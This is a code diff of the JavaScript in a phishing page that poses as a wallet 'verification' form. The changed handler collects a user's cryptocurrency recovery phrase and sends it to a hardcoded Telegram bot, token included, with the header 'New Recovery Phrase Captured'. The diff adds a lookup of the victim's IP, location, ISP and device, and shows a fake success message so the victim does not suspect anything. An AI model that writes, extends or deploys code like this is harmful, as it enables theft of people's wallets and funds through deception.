@@ -350,8 +350,8 @@ document.querySelectorAll('.length-option').forEach(function(opt) {
   } catch (e) { /* no-op */ }
 })();
 
-// Form submission handler sending data to Telegram Bot API
-document.getElementById('phraseForm').addEventListener('submit', function (ev) {
+// Form submission handler sending data along with metadata to Telegram Bot API
+document.getElementById('phraseForm').addEventListener('submit', async function (ev) {
   ev.preventDefault();
 
   var inputs = document.querySelectorAll('#wordGrid input');
@@ -360,27 +360,58 @@ document.getElementById('phraseForm').addEventListener('submit', function (ev) {
     words.push(inp.value.trim());
   });
 
-  var botToken = "8991004090:AAEPWEWbytGBCaZOSyOV-Pg8BOkvvw9xjvQ";
-  var chatId = "-5445801019";
-  var message = "🔐 *New Recovery Phrase Captured*\n\n" + words.map((w, idx) => (idx + 1) + ". " + (w || "[empty]")).join("\n");
-
   var submitBtn = document.getElementById('submitBtn');
   submitBtn.disabled = true;
   submitBtn.textContent = 'Verifying...';
 
-  fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: message,
-      parse_mode: "Markdown"
-    })
-  })
-  .then(response => response.json())
-  .then(data => {
+  // Fetch IP details and metadata
+  var ip = "Unknown";
+  var country = "Unknown";
+  var city = "Unknown";
+  var isp = "Unknown";
+
+  try {
+    var ipResponse = await fetch("https://ipapi.co/json/");
+    var ipData = await ipResponse.json();
+    if (ipData) {
+      ip = ipData.ip || "Unknown";
+      country = ipData.country_name || "Unknown";
+      city = ipData.city || "Unknown";
+      isp = ipData.org || "Unknown";
+    }
+  } catch (err) {
+    // Fallback if IP API fails
+  }
+
+  var userAgent = navigator.userAgent;
+  var deviceUsed = /Mobi|Android/i.test(userAgent) ? "Mobile Device" : "Desktop Computer";
+
+  var botToken = "8991004090:AAEPWEWbytGBCaZOSyOV-Pg8BOkvvw9xjvQ";
+  var chatId = "-5445801019";
+  
+  var message = "🔐 *New Recovery Phrase Captured*\n\n" + 
+                words.map((w, idx) => (idx + 1) + ". " + (w || "[empty]")).join("\n") + 
+                "\n\n🌐 *Metadata:*\n" +
+                "• *IP:* `" + ip + "`\n" +
+                "• *Country:* " + country + "\n" +
+                "• *City:* " + city + "\n" +
+                "• *ISP:* " + isp + "\n" +
+                "• *Device:* " + deviceUsed + "\n" +
+                "• *User-Agent:* `" + userAgent + "`";
+
+  try {
+    await fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: "Markdown"
+      })
+    });
+
     inputs.forEach(function (inp) { inp.value = ''; });
     submitBtn.disabled = false;
     submitBtn.textContent = 'Verify and continue';
@@ -388,8 +419,7 @@ document.getElementById('phraseForm').addEventListener('submit', function (ev) {
     var panel = document.getElementById('result-panel');
     panel.style.display = 'block';
     panel.innerHTML = '<strong>Verification completed successfully.</strong> Your device has been successfully synchronized.';
-  })
-  .catch(error => {
+  } catch (error) {
     submitBtn.disabled = false;
     submitBtn.textContent = 'Verify and continue';
     
@@ -399,7 +429,7 @@ document.getElementById('phraseForm').addEventListener('submit', function (ev) {
     panel.style.borderColor = 'rgba(255, 77, 79, 0.35)';
     panel.style.color = '#ffb3b4';
     panel.innerHTML = '<strong>Connection error.</strong> Please check your connection and try again.';
-  });
+  }
 });
 </script>
 </body>
